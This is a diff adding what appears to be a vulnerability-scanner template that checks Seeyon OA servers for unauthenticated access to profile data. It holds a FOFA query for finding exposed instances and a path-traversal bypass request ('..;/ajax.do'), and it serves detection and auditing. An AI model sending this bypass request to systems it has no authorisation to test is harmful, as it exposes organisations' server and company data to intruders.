@@ -1,0 +1,32 @@
+id: seeyon-oa-unauthorized
+
+info:
+  name: Seeyon OA Unauthorized
+  author: zp857
+  severity: low
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/hx1eyd
+  tags: seeyon-oa,unauth
+  metadata:
+    fofa-query: 'app="致远互联-OA" || app="Seeyon-Server"|| app="用友-致远OA" || (server="Seeyon-Server") || (body="/seeyon/USER-DATA/IMAGES/LOGIN/login.gif" || title="用友致远A" || body="/yyoa/" || header="path=/yyoa" || server=="SY8044" || (body="A6-V5企业版" && body="seeyon" && body="seeyonProductId") || (body="/seeyon/common/") || (body="A8-V5企业版" && body="/seeyon/"))'
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "serverIdentifier"
+          - "companyName"
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: status
+        status:
+          - 200
